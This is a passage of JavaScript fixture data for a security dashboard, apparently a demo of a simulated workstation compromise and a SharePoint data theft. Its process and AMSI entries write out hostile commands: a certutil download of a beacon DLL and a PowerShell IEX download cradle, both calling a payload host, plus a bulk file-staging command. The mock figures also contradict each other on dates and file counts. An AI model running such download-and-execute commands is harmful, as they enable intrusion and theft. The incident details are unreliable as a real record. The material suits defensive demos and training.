            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } },
          { time:'01 Apr 2026  09:10:33', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'Push approved', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, USA' } }
        ]
      }
    }
  },
  'dev-ws045': {
    type: 'device', modalTitle: 'Device Details · CORP-WS-045',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 82,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Compromised Host',
          metrics: [
            { icon:'🛡', label:'Vulnerabilities', value:'4 (1 Critical)', color:'#dc2626' },
            { icon:'⚙', label:'Suspicious Processes', value:'2', color:'#ea580c' },
            { icon:'🔧', label:'Rogue Services', value:'1', color:'#dc2626' },
            { icon:'⚠', label:'Unpatched Days', value:'7', color:'#d97706' },
            { icon:'🔒', label:'EDR Status', value:'Healthy', color:'#16a34a' },
            { icon:'🌐', label:'Tor Connections', value:'2 outbound', color:'#dc2626' }
          ],
          firstSeen: '2024-03-15',
          lastActivity: '03 Apr 2026 15:37:01',
          investigationStatus: 'Active — Isolation recommended'
        }
      },
      deviceDetails: {
        label: 'Device Details', expanded: true,
        kv: {
          'Hostname':'CORP-WS-045',
          'OS':'Windows 11 Pro 23H2 (Build 22631.3737)',
          'Domain':'contoso.local',
          'OU':'OU=Workstations,DC=contoso,DC=local',
          'Last Patch':'2025-05-28',
          'AV':'Microsoft Defender ATP (Active, Signatures: 2025-06-04)',
          'EDR Agent':'Defender for Endpoint — Healthy',
          'Compliance':'Compliant ✓',
          'Assigned User':'m.henderson',
          'IP Address':'192.168.1.22',
          'MAC Address':'A4:5E:60:B2:14:7C',
          'Last Seen':'03 Apr 2026  15:37:01',
          'Uptime':'4d 6h 22m',
          'Disk Encryption':'BitLocker — Enabled (XTS-AES 256)',
          'TPM':'2.0 — Active'
        }
      },
      vulnerabilities: {
        label: 'Vulnerabilities (4)', expanded: true, viewAll: true,
        timeline: [
          { time:'Critical — CVSS 9.8', dot:'red', malicious: true,
            details: { 'CVE':'CVE-2025-21418', 'Component':'Windows AFD Driver', 'Type':'Privilege Escalation', 'Exploit Available':'Yes — Active in wild ⚠', 'Patch':'KB5034763 (not installed)', 'CISA KEV':'Listed — Due 2025-06-10' } },
          { time:'High — CVSS 8.1', dot:'red',
            details: { 'CVE':'CVE-2025-21391', 'Component':'Windows Storage', 'Type':'Elevation of Privilege', 'Exploit Available':'PoC available', 'Patch':'KB5034763 (not installed)', 'CISA KEV':'Not listed' } },
          { time:'Medium — CVSS 6.5', dot:'orange',
            details: { 'CVE':'CVE-2025-21377', 'Component':'NTLM Hash Disclosure', 'Type':'Information Disclosure', 'Exploit Available':'No', 'Patch':'KB5034763 (not installed)', 'CISA KEV':'Not listed' } },
          { time:'Low — CVSS 3.3', dot:'green',
            details: { 'CVE':'CVE-2025-21200', 'Component':'Windows DWM', 'Type':'Info Disclosure', 'Exploit Available':'No', 'Patch':'Available', 'CISA KEV':'Not listed' } }
        ]
      },
      misconfigurations: {
        label: 'Misconfigurations (3)', expanded: false, viewAll: true,
        timeline: [
          { time:'Critical', dot:'red', malicious: true,
            details: { 'Rule':'CIS 18.10.43.13 — PowerShell Script Block Logging', 'Status':'Not Configured ⚠', 'Expected':'Enabled', 'Impact':'Attacker scripts run without audit trail', 'Remediation':'Enable via GPO or Intune policy' } },
          { time:'High', dot:'red',
            details: { 'Rule':'CIS 2.3.1.1 — Local Admin Account Renamed', 'Status':'Not Renamed ⚠', 'Expected':'Non-default name', 'Impact':'Brute force target', 'Remediation':'Rename via LAPS or GPO' } },
          { time:'Medium', dot:'orange',
            details: { 'Rule':'CIS 18.9.65.3 — WDigest Authentication', 'Status':'Enabled ⚠', 'Expected':'Disabled', 'Impact':'Credentials stored in cleartext in LSASS', 'Remediation':'Set HKLM\\SYSTEM\\...\\WDigest\\UseLogonCredential = 0' } }
        ]
      },
      installedSoftware: {
        label: 'Installed Software (Notable)', expanded: false, viewAll: true,
        timeline: [
          { time:'Suspicious', dot:'red', malicious: true,
            details: { 'Name':'FileSync Pro 2.1.4', 'Publisher':'Unknown', 'Installed':'2025-06-04 14:35', 'Signed':'No ⚠', 'Location':'C:\\ProgramData\\FileSyncPro\\', 'Risk':'Unauthorized — not in approved software list' } },
          { time:'Standard', dot:'green',
            details: { 'Name':'Microsoft Office 365 ProPlus', 'Publisher':'Microsoft', 'Version':'16.0.17726.20160', 'Signed':'Yes', 'Location':'C:\\Program Files\\Microsoft Office\\' } },
          { time:'Standard', dot:'green',
            details: { 'Name':'7-Zip 24.08', 'Publisher':'Igor Pavlov', 'Version':'24.08', 'Signed':'Yes' } }
        ]
      },
      cloudAsset: {
        label: 'Cloud Asset & MDM', expanded: false,
        kv: {
          'Intune Device ID':'d4e5f6a7-b8c9-0d1e-2f3a-4b5c6d7e8f9a',
          'Intune Compliance':'Compliant',
          'Azure AD Registered':'Yes — Hybrid Joined',
          'Azure AD Device ID':'a1b2c3d4-e5f6-...',
          'Autopilot':'Enrolled',
          'Configuration Profiles':'8 applied (1 error)',
          'Windows Update Ring':'Fast Ring — Pilot',
          'Last Intune Sync':'03 Apr 2026  12:00:00'
        }
      },
      loginActivity: {
        label: 'Login Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'192.168.1.22', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'Critical — Post-compromise session' } },
          { time:'03 Apr 2026  14:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A (domain auth)', 'Risk':'None' } },
          { time:'03 Apr 2026  08:30:22', dot:'green',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source IP':'10.0.0.5', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } }
        ],
        viewAllData: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'192.168.1.22', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'Critical — Post-compromise session' } },
          { time:'03 Apr 2026  14:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A (domain auth)', 'Risk':'None' } },
          { time:'03 Apr 2026  08:30:22', dot:'green',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source IP':'10.0.0.5', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } },
          { time:'03 Apr 2026  07:55:00', dot:'orange',
            details: { 'User':'unknown', 'Logon Type':'Network', 'Source IP':'10.112.11.1', 'Target':'CORP-WS-045', 'Status':'Failure — Invalid credentials', 'MFA':'N/A', 'Risk':'Medium' } },
          { time:'02 Apr 2026  17:45:00', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Network', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045 → \\\\fs01', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } },
          { time:'02 Apr 2026  09:10:00', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } },
          { time:'01 Apr 2026  22:15:00', dot:'orange',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source IP':'10.0.0.5', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'Medium — Off-hours login' } }
        ]
      },
      processesOnHost: {
        label: 'Processes Running on Host', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'powershell.exe', 'PID':'4892', 'User':'m.henderson', 'Command':'-nop -w hidden -encodedcommand ...', 'CPU':'12%', 'Memory':'84 MB', 'Status':'Running' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process powershell.exe…' } },
          { time:'03 Apr 2026  15:36:25', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'wuhelper.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'wuhelper.exe', 'PID':'5501', 'User':'SYSTEM', 'Command':'C:\\Windows\\Temp\\wuhelper.exe', 'CPU':'3%', 'Memory':'22 MB', 'Status':'Running' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process wuhelper.exe…' } },
          { time:'03 Apr 2026  10:15:05', dot:'green',
            viewOnGraph: { nodeId:'proc-explorer', label:'explorer.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'explorer.exe', 'PID':'1204', 'User':'m.henderson', 'Command':'C:\\Windows\\explorer.exe', 'CPU':'1%', 'Memory':'120 MB', 'Status':'Running' } },
          { time:'03 Apr 2026  10:15:02', dot:'green',
            viewOnGraph: { nodeId:'proc-defender', label:'MsMpEng.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'MsMpEng.exe', 'PID':'824', 'User':'SYSTEM', 'Command':'Defender Antimalware Service', 'CPU':'4%', 'Memory':'210 MB', 'Status':'Running' } }
        ]
      },
      servicesOnHost: {
        label: 'Services Created on Host', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Service':'WinUpdateSvc', 'Display Name':'Windows Update Helper Service', 'Account':'SYSTEM', 'Binary':'C:\\Windows\\Temp\\wuhelper.exe', 'Signed':'No ⚠', 'Status':'Running' },
            action: { label:'⊘ Stop Service', type:'outline', toast:'Stopping WinUpdateSvc service…' } },
          { time:'03 Apr 2026  06:12:30', dot:'green',
            viewOnGraph: { nodeId:'svc-wuauserv', label:'wuauserv', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Service':'wuauserv', 'Display Name':'Windows Update (Legitimate)', 'Account':'SYSTEM', 'Binary':'C:\\Windows\\System32\\svchost.exe', 'Signed':'Yes', 'Status':'Running' } },
          { time:'03 Apr 2026  06:12:30', dot:'green',
            viewOnGraph: { nodeId:'svc-windefend', label:'WinDefend', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Service':'WinDefend', 'Display Name':'Microsoft Defender Antivirus', 'Account':'SYSTEM', 'Binary':'C:\\ProgramData\\Microsoft\\...\\MsMpEng.exe', 'Signed':'Yes', 'Status':'Running' } }
        ]
      },
      usersLoggedOn: {
        label: 'User Accounts Logged On', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  10:15:00', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive (Console)', 'Source':'Keyboard', 'Session':'Active', 'Duration':'5h 22m' } },
          { time:'03 Apr 2026  08:30:22', dot:'green',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source':'10.0.0.5 (Admin-WS)', 'Session':'Disconnected', 'Duration':'45m' } },
          { time:'30 Mar 2026  06:12:30', dot:'green',
            details: { 'User':'NT AUTHORITY\\SYSTEM', 'Logon Type':'Service', 'Source':'Local', 'Session':'Background', 'Duration':'4d 6h' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: true, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:38:22', dot:'red',
            viewOnGraph: { nodeId:'alert-arp-spoofing-1', label:'LAN ARP Spoofing', icon:'🔔', sourceEntity:'dev-ws045' },
            alertProfileId: 'alert-arp-spoofing-1',
            detailsGrid: [
              { label:'14:38:22 LAN ARP Spoofing — MITM', value:'Network Attack', tag:'Type', tagVal:'CORRELATION', mitre:'T1557.002 (ARP Cache Poisoning)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'03 Apr 2026  15:36:22', dot:'red',
            viewOnGraph: { nodeId:'alert-sus-service', label:'Suspicious Service', icon:'🔔', sourceEntity:'dev-ws045' },
            alertProfileId: 'alert-sus-service',
            detailsGrid: [
              { label:'15:36:22 Suspicious Service Installed', value:'Persistence', tag:'Type', tagVal:'EDR', mitre:'T1543.003 (Create/Modify System Process)', source:'CORP-WS-045', status:'Open', severity:'High' }
            ] },
          { time:'03 Apr 2026  15:37:01', dot:'red',
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell', icon:'🔔', sourceEntity:'dev-ws045' },
            alertProfileId: 'alert-enc-powershell',
            detailsGrid: [
              { label:'15:37:01 Encoded PowerShell Execution', value:'Execution', tag:'Type', tagVal:'EDR', mitre:'T1059.001 (PowerShell)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      }
    }
  },
  'svc-sharepoint': {
    type: 'service', modalTitle: 'Service Details · SharePoint Online',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 85,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Data Exfiltration Detected',
          metrics: [
            { icon:'📁', label:'Files Exfiltrated', value:'24', color:'#dc2626' },
            { icon:'⏱', label:'Exfil Duration', value:'3 min', color:'#dc2626' },
            { icon:'📊', label:'Sensitive Files', value:'8 (Confidential)', color:'#ea580c' },
            { icon:'🔗', label:'Anomalous Sessions', value:'2', color:'#ea580c' },
            { icon:'🌐', label:'External Shares', value:'0', color:'#16a34a' },
            { icon:'⚠', label:'DLP Violations', value:'3', color:'#dc2626' }
          ],
          firstSeen: '2024-01-10',
          lastActivity: '03 Apr 2026 15:35:00',
          investigationStatus: 'Active — File access revoked'
        }
      },
      serviceDetails: {
        label: 'Service Details', expanded: true,
        kv: {
          'Service':'SharePoint Online',
          'Category':'Collaboration & File Sharing',
          'Provider':'Microsoft 365',
          'Tenant':'contoso.sharepoint.com',
          'Status':'Active',
          'DLP Policies':'3 active (1 in audit-only)',
          'Sensitivity Labels':'Enabled',
          'External Sharing':'Restricted to approved domains'
        }
      },
      fileAccessAnomaly: {
        label: 'File Access Anomaly', expanded: true, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:34:00 – 15:38:00', dot:'red', malicious: true,
            details: {
              'User':'m.henderson',
              'Action':'Bulk Download',
              'Files Accessed':'142 files in 4 minutes',
              'Normal Baseline':'8 files/day (peer avg)',
              'Deviation':'17.75× above normal',
              'Sites':'Finance-Reports, HR-Confidential, Project-Atlas',
              'Sensitive Files':'3 flagged (Confidential label)',
              'File Types':'.xlsx (84), .pdf (32), .docx (18), .pptx (8)',
              'Total Size':'2.3 GB'
            } }
        ]
      },
      sensitiveFiles: {
        label: 'Sensitive Files Accessed', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:34:12', dot:'red', malicious: true,
            details: { 'File':'Q4-2025-Revenue-Projections.xlsx', 'Site':'Finance-Reports', 'Label':'Confidential — Finance', 'Classification':'PII + Financial', 'Size':'4.2 MB', 'Action':'Downloaded' } },
          { time:'03 Apr 2026  15:35:08', dot:'red', malicious: true,
            details: { 'File':'Employee-Compensation-2026.xlsx', 'Site':'HR-Confidential', 'Label':'Highly Confidential — HR', 'Classification':'PII', 'Size':'1.8 MB', 'Action':'Downloaded' } },
          { time:'03 Apr 2026  15:36:44', dot:'orange',
            details: { 'File':'Project-Atlas-Architecture.pdf', 'Site':'Project-Atlas', 'Label':'Internal Only', 'Classification':'IP', 'Size':'12.4 MB', 'Action':'Downloaded' } }
        ]
      },
      dlpPolicies: {
        label: 'DLP Policy Status', expanded: false,
        kv: {
          'Block External Sharing of Confidential':'Active — Triggered 2× ⚠',
          'Warn on PII Download':'Audit Only ⚠ (not blocking)',
          'Require Justification > 50 Files':'Not Configured ⚠',
          'Block USB Copy of Labeled Files':'Active'
        }
      },
      processes: {
        label: 'Related Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-oauth', label:'OAuth Token (FileSync Pro)', icon:'⚙', sourceEntity:'svc-sharepoint' },
            details: { 'Process Name':'OAuth Token (FileSync Pro)', 'Type':'Bearer Token', 'Action':'Files.ReadWrite.All — used to bulk download', 'Files Accessed':'142', 'Data Volume':'2.3 GB' } },
          { time:'03 Apr 2026  15:34:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'svc-sharepoint' },
            details: { 'Process Name':'powershell.exe', 'Context':'PnP.PowerShell module used for bulk file operations', 'User':'m.henderson', 'Command':'Get-PnPFile -Url /Finance/* -Path C:\\Temp\\exfil', 'Status':'Completed' } }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:32:10', dot:'green',
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'svc-sharepoint' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Authentication provider for SharePoint SSO', 'Status':'Active' } },
          { time:'03 Apr 2026  15:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'svc-sharepoint' },
            details: { 'Service Name':'WinUpdateSvc', 'Relationship':'Exfiltrated data staged via this service\'s C2 channel', 'Host':'CORP-WS-045', 'Status':'Running — Stop recommended' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:34:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-bulk-download', label:'Bulk File Download', icon:'🔔', sourceEntity:'svc-sharepoint' },
            alertProfileId: 'alert-bulk-download',
            detailsGrid: [
              { label:'15:34:30 Bulk File Download Detected', value:'142 files in 4 min', tag:'Type', tagVal:'DLP', mitre:'T1530 (Data from Cloud Storage)', source:'SharePoint Online', status:'Open', severity:'Critical' }
            ] },
          { time:'03 Apr 2026  15:35:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-sensitive-access', label:'Sensitive File Access', icon:'🔔', sourceEntity:'svc-sharepoint' },
            alertProfileId: 'alert-sensitive-access',
            detailsGrid: [
              { label:'15:35:00 Confidential File Accessed', value:'HR + Finance data', tag:'Type', tagVal:'DLP', mitre:'T1213.002 (Sharepoint)', source:'SharePoint Online', status:'Open', severity:'High' }
            ] },
          { time:'03 Apr 2026  15:38:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-data-exfil', label:'Data Exfiltration', icon:'🔔', sourceEntity:'svc-sharepoint' },
            alertProfileId: 'alert-data-exfil',
            detailsGrid: [
              { label:'15:38:30 Potential Data Exfiltration', value:'2.3 GB transferred', tag:'Type', tagVal:'DLP', mitre:'T1041 (Exfiltration Over C2 Channel)', source:'SharePoint Online', status:'Open', severity:'Critical' }
            ] }
        ]
      }
    }
  },
  'proc-oauth': {
    type: 'process', modalTitle: 'Process Details · OAuth Token',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 72,
          maxScore: 100,
          severity: 'High',
          statusBadge: 'Suspicious Token Activity',
          metrics: [
            { icon:'🔑', label:'Active Tokens', value:'3', color:'#ea580c' },
            { icon:'⚠', label:'Unregistered App', value:'FileSync Pro', color:'#dc2626' },
            { icon:'📋', label:'Excessive Scopes', value:'Mail + Files', color:'#ea580c' },
            { icon:'⏱', label:'Token Age', value:'Post-compromise', color:'#dc2626' },
            { icon:'🔐', label:'Consent Type', value:'User (no admin)', color:'#d97706' },
            { icon:'🛡', label:'Publisher Verified', value:'No ✗', color:'#dc2626' }
          ],
          firstSeen: '03 Apr 2026 14:35:00',
          lastActivity: '03 Apr 2026 15:36:22',
          investigationStatus: 'Active — Token revocation recommended'
        }
      },
      processDetails: {
        label: 'Token Details', expanded: true,
        kv: {
          'Token Type':'OAuth 2.0 Bearer Token',
          'Grant Type':'Authorization Code',
          'Client App':'FileSync Pro (App ID: 7a3b8c4d-...)',
          'Scope':'Mail.Read, Mail.ReadWrite, Files.ReadWrite.All, User.Read',
          'Issued':'2025-06-04 14:33 UTC',
          'Expires':'2025-06-04 15:33 UTC (1h lifetime)',
          'Refresh Token':'Active (14-day sliding window)',
          'Issuer':'https://login.microsoftonline.com',
          'Audience':'https://graph.microsoft.com',
          'IP at Issuance':'185.220.101.42 (Tor) ⚠',
          'MFA Claim':'amr: [pwd, mfa] — token replay suspected'
        }
      },
      tokenAnomaly: {
        label: 'Token Anomalies', expanded: true, viewAll: true,
        timeline: [
          { time:'Critical', dot:'red', malicious: true,
            details: {
              'Anomaly':'Broad Scope from Untrusted Location',
              'Detail':'Files.ReadWrite.All + Mail.ReadWrite granted from Tor exit node',
              'Baseline':'User normally uses only Mail.Read from corporate IP',
              'Risk':'Token can read/write all files and email'
            } },
          { time:'High', dot:'red',
            details: {
              'Anomaly':'Suspicious App Consent',
              'Detail':'FileSync Pro — not in approved app catalog',
              'Publisher':'Unverified publisher',
              'First Seen':'2025-06-04 (today)',
              'Admin Consent':'No — user self-consented'
            } },
          { time:'Medium', dot:'orange',
            details: {
              'Anomaly':'Token Replay Indicators',
              'Detail':'Same token used from 2 IPs within 3 minutes',
              'IP 1':'10.18.1.81 (NYC Office)',
              'IP 2':'185.220.101.42 (Bucharest, Tor)',
              'Time Gap':'7 minutes — physically impossible'
            } }
        ]
      },
      tokenUsage: {
        label: 'Token Usage (Graph API Calls)', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:34:12', dot:'red', malicious: true,
            details: { 'API Call':'GET /me/drive/root/children', 'Purpose':'List all OneDrive files', 'Response':'200 OK (1,247 items)' } },
          { time:'03 Apr 2026  14:35:01', dot:'red', malicious: true,
            details: { 'API Call':'GET /me/messages?$top=500', 'Purpose':'Read email messages', 'Response':'200 OK (500 messages)', 'Data Volume':'12.4 MB' } },
          { time:'03 Apr 2026  14:36:30', dot:'red', malicious: true,
            details: { 'API Call':'POST /me/drive/items/{id}/content', 'Purpose':'Download file', 'Response':'200 OK', 'File':'Q4-Revenue-Projections.xlsx' } }
        ]
      },
      relatedTokens: {
        label: 'Related Active Tokens', expanded: false,
        kv: {
          'Refresh Token':'Active — revocation recommended',
          'Other Active Tokens':'2 (Outlook Web, Teams Desktop)',
          'Service Principal Tokens':'0',
          'Last Token Refresh':'03 Apr 2026  14:33 UTC'
        }
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:34:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'proc-oauth' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'Token used for Files.ReadWrite.All — 142 files downloaded', 'Action':'Bulk file download via Graph API', 'Status':'Active — Access revoked' } },
          { time:'03 Apr 2026  14:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'proc-oauth' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Token issued via Azure AD consent flow', 'App':'FileSync Pro (unregistered)', 'Status':'Active — Token revocation recommended' } }
        ]
      },
      processes: {
        label: 'Related Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'proc-oauth' },
            details: { 'Process Name':'powershell.exe', 'Relationship':'Used token scope to execute file operations', 'PID':'4892', 'User':'m.henderson', 'Status':'Running — Kill recommended' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-oauth-token', label:'Suspicious OAuth Token', icon:'🔔', sourceEntity:'proc-oauth' },
            alertProfileId: 'alert-oauth-token',
            detailsGrid: [
              { label:'14:33:15 Suspicious OAuth Token', value:'Broad Scope', tag:'Type', tagVal:'Cloud Security', mitre:'T1550.001 (Application Access Token)', source:'Azure AD', status:'Open', severity:'High' }
            ] },
          { time:'03 Apr 2026  14:35:00', dot:'orange',
            viewOnGraph: { nodeId:'alert-app-consent', label:'New App Consent', icon:'🔔', sourceEntity:'proc-oauth' },
            alertProfileId: 'alert-app-consent',
            detailsGrid: [
              { label:'14:35:00 New App Consent — FileSync Pro', value:'Unregistered App', tag:'Type', tagVal:'App Governance', mitre:'T1098.003 (Additional Cloud Roles)', source:'Azure AD', status:'Open', severity:'Medium' }
            ] }
        ]
      }
    }
  },
  'proc-powershell': {
    type: 'process', modalTitle: 'Process Details · Powershell.exe',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 91,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Malicious Execution',
          metrics: [
            { icon:'⚠', label:'AMSI Detections', value:'3', color:'#dc2626' },
            { icon:'🔗', label:'C2 Connection', value:'Active', color:'#dc2626' },
            { icon:'📦', label:'Payload Downloaded', value:'beacon.dll', color:'#dc2626' },
            { icon:'🔐', label:'Encoded Commands', value:'2', color:'#ea580c' },
            { icon:'🧬', label:'Obfuscation', value:'Base64 + IEX', color:'#ea580c' },
            { icon:'📊', label:'Child Processes', value:'3', color:'#d97706' }
          ],
          firstSeen: '03 Apr 2026 15:36:22',
          lastActivity: '03 Apr 2026 15:37:01',
          investigationStatus: 'Active — Kill process recommended'
        }
      },
      processDetails: {
        label: 'Process Details', expanded: true,
        kv: { 'Process Name':'powershell.exe', 'PID':'4892', 'Parent Process':'powershell.exe (PID: 3104)', 'Command Line':'powershell.exe -nop -w hidden -encodedcommand ...', 'User':'<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider(&#39;user-m-henderson&#39;)">m.henderson</a>', 'Integrity Level':'Medium', 'Start Time':'03 Apr 2026  15:36:22', 'Status':'Running', 'Signature':'Microsoft (Valid)', 'Session ID':'2', 'Thread Count':'14', 'Handle Count':'342' }
      },
      processTree: {
        label: 'Process Tree', expanded: true, viewAll: true,
        timeline: [
          { time:'explorer.exe (PID: 1204)', dot:'green',
            viewOnGraph: { nodeId:'proc-explorer', label:'explorer.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Grandparent', 'User':'m.henderson', 'Started':'10:15:00', 'Status':'Running', 'Signed':'Yes' } },
          { time:'powershell.exe (PID: 3104)', dot:'orange',
            viewOnGraph: { nodeId:'proc-ps-parent', label:'powershell.exe (PID 3104)', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Parent', 'User':'m.henderson', 'Started':'15:35:50', 'Command':'-ExecutionPolicy Bypass', 'Status':'Running', 'Note':'Suspicious — bypass flag' } },
          { time:'powershell.exe (PID: 4892) ← THIS', dot:'red', malicious: true,
            details: { 'Level':'Current', 'User':'m.henderson', 'Started':'15:36:22', 'Command':'-nop -w hidden -encodedcommand ...', 'Status':'Running', 'Note':'Hidden window + encoded command' } },
          { time:'cmd.exe (PID: 5120)', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-cmd-child', label:'cmd.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Child', 'User':'m.henderson', 'Started':'15:36:35', 'Command':'cmd.exe /c whoami && ipconfig /all', 'Status':'Exited (0)' } },
          { time:'certutil.exe (PID: 5244)', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-certutil', label:'certutil.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Child', 'User':'m.henderson', 'Started':'15:36:40', 'Command':'certutil -urlcache -split -f http://staging-payload.net/beacon.dll', 'Status':'Exited (0)' } }
        ]
      },
      amsiEvents: {
        label: 'AMSI Events (Script Content)', expanded: true, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:23', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            details: { 'AMSI Detection':'Suspicious', 'Content Preview':'IEX (New-Object Net.WebClient).DownloadString("http://staging-payload.net/stager.ps1")', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed (Defender exclusion active ⚠)', 'Script Block ID':'SB-44a2-bf91' } },
          { time:'03 Apr 2026  15:36:25', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            details: { 'AMSI Detection':'Malicious', 'Content Preview':'[Reflection.Assembly]::Load($bytes) — In-memory .NET assembly load', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed ⚠', 'Note':'Fileless execution — no disk artifact' } },
          { time:'03 Apr 2026  15:36:28', dot:'red', malicious: true,
